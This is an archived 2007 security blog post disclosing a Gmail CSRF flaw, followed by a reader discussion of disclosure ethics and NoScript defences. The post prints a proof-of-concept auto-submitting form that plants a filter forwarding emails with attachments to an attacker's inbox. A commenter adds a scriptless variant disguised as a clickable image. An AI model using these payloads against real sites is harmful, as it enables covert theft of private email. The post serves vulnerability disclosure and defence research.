<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
	
<!-- Mirrored from www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:04:34 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<link rel="profile" href="http://gmpg.org/xfn/11"/>
		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
		<title>GNUCITIZEN &raquo; Google GMail E-mail Hijack Technique</title>
			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Google GMail E-mail Hijack Technique Comments Feed" href="feed/index.html" />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Google Urchin password theft madness' href='../google-urchin-password-theft-madness/index.html' />
<link rel='next' title='Owning Big Brother: Hollywood-style Exploits Included!' href='../owning-big-brother-hollywood-style-exploits-included/index.html' />
<meta name="generator" content="WordPress 3.3.2" />
<link rel='canonical' href='index.html' />
<link rel='shortlink' href='../../index2c5f.html?p=471' />
<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
	
	<body id="single" class="blog">
		<div id="header">
			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
			<p><span>Information Security Think Tank</span></p>
		</div>

<div id="navigation">
	<h2>Navigation</h2>
	<ul>
		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
			</ul>
</div>

<div id="content">
			<div id="entry">
							<div id="post-471" class="post">
	<div class="post-title"><h2><span>Google GMail E-mail Hijack Technique</span></h2></div>
	<div class="post-date"><span>published:</span> September 25th, 2007</div>
	<div class="post-content"><div class="single-content-top-widgets"></div><p>In this post I am going to show you how someone can remotely install a simple, persistent filter within a GMail account and download all previous as well as snoop onto all future email conversations.</p>

<p>The following sequence of screenshots describes how the attack works.</p>

<div class="screen"><a href="../../static/blog/2007/09/ggeht-seq1.jpg"><img src="../../static/blog/2007/09/ggeht-seq1-248x150.jpg" alt="GGEHT Seq1" title="GGEHT Seq1" width="248" height="150" class="alignnone size-thumbnail wp-image-2499" /></a> <a href="../../static/blog/2007/09/ggeht-seq2.jpg"><img src="../../static/blog/2007/09/ggeht-seq2-248x150.jpg" alt="GGEHT Seq2" title="GGEHT Seq2" width="248" height="150" class="alignnone size-thumbnail wp-image-2500" /></a> <a href="../../static/blog/2007/09/ggeht-seq3.jpg"><img src="../../static/blog/2007/09/ggeht-seq3-248x150.jpg" alt="GGEHT Seq3" title="GGEHT Seq3" width="248" height="150" class="alignnone size-thumbnail wp-image-2501" /></a></div>

<p>The victim visits a malicious page while being logged into GMail. Upon that, the page performs a <code>multipart/form-data</code> <code>POST</code> to one of the GMail alternative interfaces and injects a filter into the victim&#8217;s filter list. In the example above, the attacker writes a filter, which simply looks for emails with attachments and forward them to an email of their choice. This filter will automatically transfer all emails matching the rule. Keep in mind that future emails will be forwarded as well. The attack will remain <strong>present</strong> for as long as the victim has the filter within their filter list, even if the initial vulnerability, which was the cause of the injection, is fixed by Google.</p>

<p>The technique used in this example is known as Cross-site request forgery, or simply CSRF. I am not planning to go into details how it works. Just look it up on this blog or with your favourite search engine.</p>

<p>I am not planning to release the details of this vulnerability for now. The exploit was verified by <a href="http://blogs.zdnet.com/security/">Ryan Naraine</a> and several close friends. It does work and it is nasty if you ask me.</p>

<p><strong>UPDATE 2007/09/28</strong>: I promised to release the POC as soon as Google fixes the vulnerability. Well they did. So, here are the details:</p>

<pre><code>&lt;form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"&gt; 
	&lt;input type="hidden" name="cf2_emc" value="true"/&gt; 
	&lt;input type="hidden" name="cf2_email" value="evilinbox@mailinator.com"/&gt; 
	&lt;input type="hidden" name="cf1_from" value=""/&gt; 
	&lt;input type="hidden" name="cf1_to" value=""/&gt; 
	&lt;input type="hidden" name="cf1_subj" value=""/&gt; 
	&lt;input type="hidden" name="cf1_has" value=""/&gt; 
	&lt;input type="hidden" name="cf1_hasnot" value=""/&gt; 
	&lt;input type="hidden" name="cf1_attach" value="true"/&gt; 
	&lt;input type="hidden" name="tfi" value=""/&gt; 
	&lt;input type="hidden" name="s" value="z"/&gt; 
	&lt;input type="hidden" name="irf" value="on"/&gt; 
	&lt;input type="hidden" name="nvp_bu_cftb" value="Create Filter"/&gt; 
&lt;/form&gt; 
&lt;script&gt; 
	document.forms[0].submit();
&lt;/script&gt;</code></pre>

<p><em>The actual exploit can be launched from <a href="../../static/blog/2007/09/ggeht-exploit.htm">here</a>. It makes use of a CSRF redirection utility to simplify the process.</em></p><div class="single-content-bottom-widgets"></div></div>
	<ul class='post-meta'>
<li><span class='post-meta-key'>Launch:</span> <a href="../../static/blog/2007/09/ggeht-exploit.htm">Exploit (ggeht-exploit.htm)</a></li>
</ul>
	<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
	<div class="post-tags">Tags: <a href="../../tags/0day/index.html" rel="tag">0day</a> | <a href="../../tags/csrf/index.html" rel="tag">csrf</a> | <a href="../../tags/gmail/index.html" rel="tag">gmail</a> | <a href="../../tags/google/index.html" rel="tag">google</a></div></div>
				

				<div id="post-comments">
					<div class="comment even thread-even depth-1" id="comment-52594">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/b6ef85fccd69e62ad1debf90ce3e8db4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://buhera.blog.hu/' rel='external nofollow' class='url'>buherator</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52594">
			September 25, 2007 at 8:41 pm</a>		</div>

		<p>I think beford was faster: <a href="http://blog.beford.org/?p=3" rel="nofollow">http://blog.beford.org/?p=3</a></p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-52597">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52597">
			September 25, 2007 at 8:49 pm</a>		</div>

		<p>buherator, this is a different exploit/vulnerability all together&#8230;</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52600">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/60b7efe2b404b2704902e50c23c2e164?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://info-ninja.net/' rel='external nofollow' class='url'>xen ix</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52600">
			September 25, 2007 at 8:51 pm</a>		</div>

		<p>Wow. Checked my Filters right away and gladly I haven&#8217;t been affected.</p>
<p>Keep up the great work.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52610">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/b58996c504c5638798eb6b511e6f49af?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Anonymous</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52610">
			September 25, 2007 at 9:24 pm</a>		</div>

		<p>I&#8217;m all for giving the developer time to fix a bug, but why simultaneously disclose without detail?  There are plenty of smart people that will use it as information pointing to something that is interesting and will likely also find the bug.  Not very useful.  If you don&#8217;t like full public disclosure, say nothing at all until a fix is in place.</p>
<p>You do great work and I enjoy reading the technical details of your disclosures and research.  I&#8217;m not sure this new disclosure experiment is any better than someone saying, &#8220;There is a critical bug in IE.  Don&#8217;t use it&#8221;.</p>
<p>Please do keep up the good work even if some of us are critical of your new disclosure policy.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52615">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://maone.net/' rel='external nofollow' class='url'>Giorgio Maone</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52615">
			September 25, 2007 at 9:42 pm</a>		</div>

		<p>CSRF using POST, right? Can I assume what I&#8217;m assuming about mitigation provided by a certain Firefox extension?</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52618">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/d1e239246ee02acb2956696cd53d99db?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">troika</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52618">
			September 25, 2007 at 9:50 pm</a>		</div>

		<p>i don&#8217;t know if people realize How Much these bugs can be dangerous. E-mail is a very very personal space,the user trust it. </p>
<p>I like G.ogle but, it should slow down a bit. There  are too much services/features. The user have no time to fully understand how it works and it&#8217;s weakness. The Course To Web 2.0 it&#8217;s becoming very dangerous.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-52621">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52621">
			September 25, 2007 at 9:54 pm</a>		</div>

		<p>Giorgio, I thought that NoScript can prevent JavaScript from executing only, but it cannot prevent POST forms to submit if the user clicks on it right? Nevertheless, the attack will be a lot more difficult without JavaScript, unless there is a way to say that the forms should submit when it renders without using any scripting at all.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52628">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://maone.net/' rel='external nofollow' class='url'>Giorgio Maone</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52628">
			September 25, 2007 at 10:01 pm</a>		</div>

		<p>Petko, NoScript by default prevents every each cross-site POST from untrusted sites as part of its anti-XSS countermeasures which, incidentally, do work as anti-CSRF countermeasures in the best-practice case of POST used for non-idempotent requests, like GMail filters do.</p>
<p>So even if you manage to trick user into clicking a submit button (e.g. using clever CSS disguises), the payload will be stripped out :)</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-52633">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52633">
			September 25, 2007 at 10:06 pm</a>		</div>

		<p>Giorgio, sounds good but doesn&#8217;t that break things. I mean, CSRF is one of the most fundamental Web characteristic. Disabling it might be ok for people like us, but for the general population, that is a no go! I am not trying to make people more vulnerable. I want for the the extension to succeed. But that wont happen if it breaks pages.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52635">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/60b7efe2b404b2704902e50c23c2e164?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://info-ninja.net/' rel='external nofollow' class='url'>xen ix</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52635">
			September 25, 2007 at 10:09 pm</a>		</div>

		<p>@Anonymous: This is what happens if you silently wait for someone to fix a bug.</p>
<p><a href="http://bitsex.net/2007/09/norwegian-police-fucks-up/" rel="nofollow">http://bitsex.net/2007/09/norw.....-fucks-up/</a></p>
<p>Is this what you want?</p>
<p>What pdp is doing is very honourable. Not only does he warn us, but he keeps a lid on how to do it. If he let people know how to do it, then we would have a bunch of script kiddies probably making a mess. Now those who know and might find out how to do it are so few, so most of us won&#8217;t notice it, and it will be hopefully fixed within it might get very critical.</p>
<p>So again, what do you want? A silent warning or no warning at all?</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52637">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://maone.net/' rel='external nofollow' class='url'>Giorgio Maone</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52637">
			September 25, 2007 at 10:17 pm</a>		</div>

		<p>Petko, this anti-CSRF feature has been in place for six months now (since March, 18th) and nobody complained about it. Consider that by default NoScript filters exclusively cross-site POST requests *from untrusted to trusted* sites, and as such is very unlikely to break anything legitimate.</p>
<p>Why should you want an untrusted site to modify the state (that&#8217;s what POST is for) of a site you trust? At any rate, I repeat: I didn&#8217;t receive any complaint about it, and many people didn&#8217;t even notice &#8212; just like you ;)</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52650">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/b58996c504c5638798eb6b511e6f49af?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Anonymous</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52650">
			September 25, 2007 at 10:38 pm</a>		</div>

		<p>@xen ix</p>
<p>I&#8217;m not too interested in the script kiddie effect.  Yes, they can cause a severe nuisance.</p>
<p>What I am more concerned about are those with equal or greater talents than the public researchers that are tipped off as to where to look.  As you say, they are few and most of us won&#8217;t notice when they succeed.  What partial disclosure does is to raise the awareness of those who can exploit a weakness as they WILL know what to look for.</p>
<p>I am in the full public disclosure camp, following a reasonable private disclosure timeout to the vendor.  While you await a vendor fix in whatever timeline suits you as the discloser, don&#8217;t tip your hat to the people who have no ethics.</p>
<p>pdp does a great service to the community at large.  My only gripe is that if there is a public disclosure of any kind, make it full so that mitigations can be researched.  If you are working with the vendor and don&#8217;t want to make a full disclosure because the vendor has not yet fixed the issue, don&#8217;t publicly disclose at all.  When the vendor either fixes the problem or stops working with you, go for full public disclosure.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-52652">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52652">
			September 25, 2007 at 10:51 pm</a>		</div>

		<p>Giorgio, that&#8217;s all cool. However, I&#8217;ve seen many many different setups, especially Intranet ones, that require CSRF to work. In one recent case, the company that I was consulting had to even reduce the security level for the Internet zone, from the domain controller, in order to make their Web app work, since it requires users to be able to open file&#58;// URLs. You call that crazy. I call that crazy, but this is the real world.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52654">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/5e0f595cbc8f1811233adce10ac6c5d3?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.awesomeandrew.net/' rel='external nofollow' class='url'>Awesome AnDrEw</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52654">
			September 25, 2007 at 10:52 pm</a>		</div>

		<p>Another awesome disclosure, pdp. I always enjoy the creative uses you find for vulnerabilities. I don&#8217;t believe I ever would have thought to combine a filter with a CSRF in order to create a persistent issue within any mail service. Nice work.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52663">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://maone.net/' rel='external nofollow' class='url'>Giorgio Maone</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52663">
			September 25, 2007 at 11:25 pm</a>		</div>

		<p>Petko, not to be picky, but they need CSR, not CSRF to work :) Anyway, NoScript is very configurable on this side: &#8220;NoScript Options|Advanced|XSS|Exceptions&#8221;</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52799">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/a3b620701f9268c2da5b7d8eb8c36935?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">LiquidBrain</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52799">
			September 26, 2007 at 8:43 am</a>		</div>

		<p>Very interesting&#8230; tried and works&#8230; Great thinking&#8230;</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52801">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/89886495b27cfdc78593e1f5c8810594?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://php-ids.org/' rel='external nofollow' class='url'>.mario</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52801">
			September 26, 2007 at 8:51 am</a>		</div>

		<p>Very nice find again &#8211; and a signal to not underestimate CSRF like usual.</p>
<p>@Giorgio: I didn&#8217;t know about the CSRF protection yet &#8211; great thing.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52825">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52825">
			September 26, 2007 at 9:51 am</a>		</div>

		<p>&#8220;Nevertheless, the attack will be a lot more difficult without JavaScript, unless there is a way to say that the forms should submit when it renders without using any scripting at all.&#8221;</p>
<p>Guys,</p>
<p>Let&#8217;s remember that even if you don&#8217;t allow scripting from a certain domain (i.e.: using NoScript), we can still forge a POST request by simply tricking the user to click on a image. I love using the thumbnail of a hot chick for demo purposes. Come on, don&#8217;t tell me you wouldn&#8217;t click on it to make the picture bigger! :-D</p>
<pre><code>&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;
Click on the thumbnail to zoom in!&lt;br&gt;&lt;br&gt;
&lt;form action=&quot;<a href="http://mail.google.com/blah/blah.py&amp;quot" rel="nofollow">http://mail.google.com/blah/blah.py&#038;quot</a>; method=&quot;post&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;param1&quot; value=&quot;whatever1&quot; style=&quot;display: none;&quot; /&gt;
&lt;input type=&quot;text&quot; name=&quot;param2&quot; value=&quot;whatever2&quot; style=&quot;display: none;&quot; /&gt;
&lt;input type=&quot;image&quot; src=&quot;<a href="http://somewhere.com/hotchick.jpg&amp;quot" rel="nofollow">http://somewhere.com/hotchick.jpg&#038;quot</a>; value=&quot;Login&quot;&gt;
&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>
<p>I really doubt NoScript can stop the previous code, as we don&#8217;t use JavaScript. Anyways, this vulnerability is a KILLER and gives me lots of new ideas to poke with webmail services out there.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52848">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://maone.net/' rel='external nofollow' class='url'>Giorgio Maone</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52848">
			September 26, 2007 at 11:06 am</a>		</div>

		<p>Adrian,<br />
You probably missed my comment <a href="index.html#comment-52628" rel="nofollow">http://www.gnucitizen.org/blog.....ment-52628</a> and the discussion which followed.</p>
<p>In short, NoScript actually prevents this kind of attack even if the attacker uses a scriptless CSRF vector like yours, and the countermeasure proved to be so much transparent that neither you nor Petko noticed it even if it&#8217;s there since six months ago ( <a href="http://noscript.net/changelog#1.1.4.6.070318" rel="nofollow">http://noscript.net/changelog#1.1.4.6.070318</a> ): cross-site POST requests from untrusted sites are turned into no-data GET.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52929">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/ab78075bda345e40a6da0a50b8d45841?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Frizz</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52929">
			September 26, 2007 at 7:00 pm</a>		</div>

		<p>gmail BETA, verry inportant to read the beta thing ;)</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52933">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/c01ec1960cee5bc724047823e264550e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">hnky</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52933">
			September 26, 2007 at 7:12 pm</a>		</div>

		<p>What happens when you delete the filter?</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52939">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/1051a47d9d7e30b74ed68e9d7bc02d72?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.welkepoker.nl/' rel='external nofollow' class='url'>Vincent van den Brink</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52939">
			September 26, 2007 at 7:16 pm</a>		</div>

		<p>Nice found! To Google to fix it.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52955">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/3f97990bcee4216af83a7181d49581d2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">DrByte</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52955">
			September 26, 2007 at 9:02 pm</a>		</div>

		<p>Your friend Ryan Naraine disclosed the exploit in his plagiarism of your article and even included links to an EVIL site with the LIVE exploit, so that the unaware could get infected first hand.</p>
<p>That&#8217;s not the kind of education I need&#8230; I have requested that he edit the article with no response.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52957">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/b9ecc11019cfb35028b995dd754bab7e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Amanda</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52957">
			September 26, 2007 at 9:08 pm</a>		</div>

		<p>I can&#8217;t say nothing&#8230;</p>
<p>just&#8230;</p>
<p>Wow&#8230;</p>
<p>lol</p>
<p>Congrats for your great job!</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52965">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/42546023414d7251a54379ddf98675b7?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">jumpin joe</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52965">
			September 26, 2007 at 10:15 pm</a>		</div>

		<p>How Do We Fix This Vulnerability?</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52986">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/5d1658ac36692c8b5ff5612aa9d6a837?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">rezn</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52986">
			September 27, 2007 at 12:27 am</a>		</div>

		<p>DrByte: the links in Narrine&#8217;s blog are to an older, already patched exploit.  I don&#8217;t know why he linked to PoCs for something that is patched.</p>
<p>PDP: I just want to say that it is great how you have stepped up the technical content in the blog again, even if I&#8217;m not quite in agreement with your (non)disclosure technique.  But its your choice, so i won&#8217;t bother complaining or debating.</p>
<p>Anyway, nice job on the recent vulns, including this one.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-53116">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/5fd77a2be33565709c3a79091e31bd4d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://quadium.net/~vsync/' rel='external nofollow' class='url'>vsync</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53116">
			September 27, 2007 at 11:36 am</a>		</div>

		<blockquote><p>Let&#8217;s remember that even if you don&#8217;t allow scripting from a certain domain (i.e.: using NoScript), we can still forge a POST request by simply tricking the user to click on a image.</p></blockquote>
<p>Yes, and that&#8217;s why various RFCs recommend that servers only take action on POST requests, and that user agents make POST actions visually distinct.  Another wise and obvious rule broken by &#8220;designers&#8221;.</p>

